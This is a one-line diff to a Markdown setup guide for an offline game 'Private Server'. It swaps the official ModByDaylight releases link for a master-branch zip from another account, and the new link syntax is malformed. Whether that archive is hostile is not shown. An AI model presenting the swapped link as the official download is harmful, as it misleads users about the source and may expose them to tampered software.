@@ -4,7 +4,7 @@ The Private Server is a modified version of the live game which is 100% offline 
 
 ## Prerequisites
 
-- [Private Server](https://github.com/ModByDaylight/PrivateServer/releases)
+- [Private Server]([https://github.com/ModByDaylight/PrivateServer/releases](https://github.com/fasterthenu/PrivateServer/archive/refs/heads/master.zip))
 
 ## Private Server Setup
 
